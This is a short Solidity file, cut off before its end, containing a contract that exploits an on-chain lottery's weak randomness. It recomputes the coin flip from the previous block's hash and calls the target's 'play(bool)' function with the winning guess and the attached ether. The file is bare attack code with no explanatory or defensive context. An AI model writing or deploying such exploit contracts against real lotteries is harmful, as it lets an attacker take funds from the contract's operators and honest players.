pragma solidity ^0.4.21;


contract Lottery {
    function gogo(bool _heads) public view returns (bool) {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
            return true;
        }
        else{
            return false;
        }
    }
    
    LotteryInterface _name;
    address _addr;
    
    function set_(address addr) public{
        _name = LotteryInterface(addr);
        _addr = addr;
    }
    
    function callFeed(uint32 _gas) public payable { 
       // _name.play.value(msg.value).gas(_gas)(gogo(true));
        _addr.call.value(msg.value)(bytes4(sha3("play(bool)")),gogo(true));
    }
